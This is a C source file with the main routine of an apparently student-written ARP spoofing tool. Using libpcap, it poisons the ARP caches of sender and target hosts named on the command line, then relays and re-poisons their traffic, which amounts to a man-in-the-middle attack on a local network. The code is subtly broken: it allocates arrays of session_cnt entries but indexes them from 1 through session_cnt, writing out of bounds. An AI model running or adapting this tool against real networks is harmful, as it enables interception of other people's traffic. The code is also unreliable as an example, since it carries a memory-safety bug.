#include "include.h"

int main(int argc, char * argv[])
{
    /*--------------session count-------------*/

    int session_cnt = (argc - 2) / 2;

    if (session_cnt == 0)
    {
        printf("argc is 4 \n");
        return -1;
    }

    /******************************************/


    /*--------------Get handle-------------*/

    char errbuf[PCAP_ERRBUF_SIZE];
    char * dev = argv[1];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);  return -1;
    }

    /***************************************/

    /*****************Make Session List*******************/

    uint8_t ** Senders_MAC = (uint8_t **)malloc(sizeof(uint8_t *) * session_cnt);
    uint8_t ** Senders_IP = (uint8_t **)malloc(sizeof(uint8_t *) * session_cnt);
    uint8_t ** Targets_MAC = (uint8_t **)malloc(sizeof(uint8_t *) * session_cnt);
    uint8_t ** Targets_IP = (uint8_t **)malloc(sizeof(uint8_t *) * session_cnt);

    for(int i = 1; i < session_cnt + 1; i++)
    {
        Senders_MAC[i] = (uint8_t *)malloc(sizeof(uint8_t) * 6);
        Senders_IP[i] = (uint8_t *)malloc(sizeof(uint8_t) * 4);
        Targets_MAC[i] = (uint8_t *)malloc(sizeof(uint8_t) * 6);
        Targets_IP[i] = (uint8_t *)malloc(sizeof(uint8_t) * 4);
    }

    /*******************************************************/

    /*    Get Sender IP and Target IP    */

    for(int i=1; i < session_cnt + 1; i++)
    {
        inet_pton(AF_INET, argv[2 * i], Senders_IP[i]);
        inet_pton(AF_INET, argv[(2 * i) + 1], Targets_IP[i]);
    }

    /*************************************/

    /*****************ARP infection********************/

    for(int i = 1 ; i < session_cnt + 1; i++)   // Not use senders_mac[0] index
    {
        printf("\n\nSession %d\n\n", i);
        arp_infection(handle, dev, Senders_IP[i], Targets_IP[i], Senders_MAC[i], Targets_MAC[i], true);
    }

    /**************************************************/

    printf("\n\narp_relay\n\n");

    /*****************ARP Relay + ARP Re infection*********************/

    arp_relay(dev, handle, Senders_IP, Targets_IP, Senders_MAC, Targets_MAC, session_cnt);

    /******************************************************************/

    for(int i = 1; i < session_cnt + 1; i++)
    {
        free(Senders_MAC[i]);
        free(Senders_IP[i]);
        free(Targets_MAC[i]);
        free(Targets_IP[i]);
    }

    free(Senders_MAC);
    free(Senders_IP);
    free(Targets_MAC);
    free(Targets_IP);

    pcap_close(handle);
    return 0;
}
